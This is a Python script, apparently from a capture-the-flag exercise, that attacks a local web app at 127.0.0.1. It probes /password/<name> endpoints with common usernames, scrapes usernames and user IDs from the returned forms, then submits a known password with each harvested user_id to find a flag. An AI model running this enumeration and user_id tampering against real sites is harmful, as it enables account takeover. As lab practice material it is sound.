import requests
import re

BASE_URL = "http://127.0.0.1:32883"

print("[*] Checking if /password/<string> endpoints work for non-numeric values\n")

# We know /password/test works - let's try other strings
test_strings = [
    "test", "admin", "user", "root", "guest", "john", "alice",
    "password", "login", "auth", "verify", "check"
]

valid_endpoints = []

for string_val in test_strings:
    try:
        resp = requests.get(f"{BASE_URL}/password/{string_val}", allow_redirects=False, timeout=3)
        
        if resp.status_code == 200:
            print(f"[+] VALID: /password/{string_val}")
            print(f"    Status: {resp.status_code}")
            print(f"    Length: {len(resp.text)}B")
            
            # Extract form details
            username_match = re.search(r'value="([^"]+)"[^>]*name="username"', resp.text)
            user_id_match = re.search(r'value="(\d+)"[^>]*name="user_id"', resp.text)
            welcome_match = re.search(r'Welcome, ([^!]+)!', resp.text)
            
            username = username_match.group(1) if username_match else "N/A"
            user_id = user_id_match.group(1) if user_id_match else "N/A"
            welcome_name = welcome_match.group(1) if welcome_match else "N/A"
            
            print(f"    Username: {username}")
            print(f"    User ID: {user_id}")
            print(f"    Welcome: {welcome_name}\n")
            
            valid_endpoints.append({
                'endpoint': string_val,
                'username': username,
                'user_id': user_id,
                'name': welcome_name,
                'response': resp.text
            })
            
            # Check for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group(0)}\n")
                print(f"Full response:\n{resp.text}\n")
        
        elif resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if 'error' not in location.lower():
                print(f"[?] /password/{string_val}: 302 to {location}")
    
    except Exception as e:
        pass

print(f"\n[SUMMARY]")
print(f"Valid endpoints found: {len(valid_endpoints)}")

if valid_endpoints:
    print(f"\n[+] Attempting to authenticate with discovered endpoints")
    
    for endpoint_info in valid_endpoints:
        print(f"\n[*] Testing {endpoint_info['endpoint']} (user_id={endpoint_info['user_id']})")
        
        # Try the password "test" which we know works
        auth_data = {
            'username': endpoint_info['username'],
            'password': 'test',
            'user_id': endpoint_info['user_id']
        }
        
        try:
            auth_resp = requests.post(f"{BASE_URL}/password/test", data=auth_data, allow_redirects=True, timeout=5)
            
            print(f"  Auth result: Status {auth_resp.status_code}, URL: {auth_resp.url}")
            print(f"  Response length: {len(auth_resp.text)}B")
            
            # Check for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
            if flag_match:
                print(f"\n  [!] FLAG: {flag_match.group(0)}")
                print(f"\n  Full response:\n{auth_resp.text}")
        except Exception as e:
